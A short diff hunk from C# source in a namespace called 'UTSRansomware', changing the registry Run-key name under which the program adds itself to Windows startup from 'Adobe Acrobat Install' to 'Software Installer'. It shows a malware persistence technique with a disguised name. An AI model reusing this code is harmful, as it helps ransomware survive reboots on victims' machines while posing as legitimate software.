@@ -42,7 +42,7 @@ namespace UTSRansomware
         // Makes program launch on startup
         public static void AddToStartup()
         {
-            string appName = "Adobe Acrobat Install";
+            string appName = "Software Installer";
             string appPath = System.Reflection.Assembly.GetExecutingAssembly().Location;
 
             RegistryKey startupKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
